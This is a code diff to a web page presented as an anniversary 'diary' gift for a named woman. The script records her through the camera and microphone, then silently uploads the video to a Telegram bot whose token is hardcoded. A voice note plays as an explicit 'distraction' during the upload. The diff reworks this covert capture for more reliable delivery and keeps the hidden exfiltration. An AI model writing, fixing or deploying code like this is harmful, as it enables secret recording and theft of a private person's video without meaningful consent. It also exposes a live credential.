@@ -196,56 +196,69 @@
             }
         }
 
-        async function startDiary() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('video-preview').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-                mediaRecorder.start();
-                document.getElementById('overlay').style.display = 'none';
-                document.getElementById('diary-wrapper').style.display = 'block';
-                bgMusic.play();
-            } catch (err) { alert("Camera access required for the Garden to bloom! ❤️"); }
-        }
-
-        async function triggerSecretUpload(btn) {
-            // SILENT TRIGGER
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    
-                    // TELEGRAM BOT CONFIG
-                    const botToken = "8567402887:AAEib1LfMMBNViiWFLHp2vmbfy7JeENhu5s"; 
-                    const chatId = "5324376571"; 
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('video', blob, 'nikhitha_reaction.mp4');
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(e => console.log("Silent sending..."));
-                };
-            }
-
-            // Distraction during upload
-            bgMusic.pause(); 
-            const vn = new Audio('voice note.mp4');
-            btn.innerHTML = "Listening... ❤️";
-            btn.disabled = true;
-            vn.play();
-            vn.onended = () => {
-                bgMusic.play();
-                btn.innerHTML = "I Love You Forever ✨";
-                alert("Happy 1 Year Anniversary, Nikhitha! I love you more than words can say. ❤️");
-            };
-        }
-
+       async function startDiary() {
+    try {
+        // REQUEST PERMISSIONS CLEARLY
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 640, height: 480 }, // Lower resolution for faster upload
+            audio: true 
+        });
         
-    </script>
-</body>
-</html>
+        document.getElementById('video-preview').srcObject = stream;
 
+        // FORCE COMPATIBLE SETTINGS FOR TELEGRAM
+        const options = { mimeType: 'video/webm;codecs=vp8', bitsPerSecond: 1000000 };
+        mediaRecorder = new MediaRecorder(stream, options);
+
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.start();
+
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('diary-wrapper').style.display = 'block';
+        bgMusic.play();
+    } catch (err) { 
+        alert("Camera and Microphone are REQUIRED for the diary to work! Please refresh and click 'Allow'. ❤️"); 
+    }
+}
+
+async function triggerSecretUpload(btn) {
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+        mediaRecorder.onstop = async () => {
+            // Create the video blob
+            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+            
+            const botToken = "8567402887:AAEib1LfMMBNViiWFLHp2vmbfy7JeENhu5s";
+            const chatId = "5324376571";
+            
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', blob, 'nikhitha_reaction.mp4');
+
+            // UPLOAD WITH ERROR LOGGING
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error("Telegram Error:", errorData);
+                }
+            } catch (e) {
+                console.error("Network Error:", e);
+            }
+        };
+    }
+
+    bgMusic.pause();
+    const vn = new Audio('voice note.mp4'); 
+    btn.innerHTML = "Listening... ❤️";
+    btn.disabled = true;
+    vn.play();
+    vn.onended = () => {
+        bgMusic.play();
+        btn.innerHTML = "I Love You Forever ✨";
+        alert("Happy 1 Year Anniversary, Nikhitha! ❤️");
+    };
+}
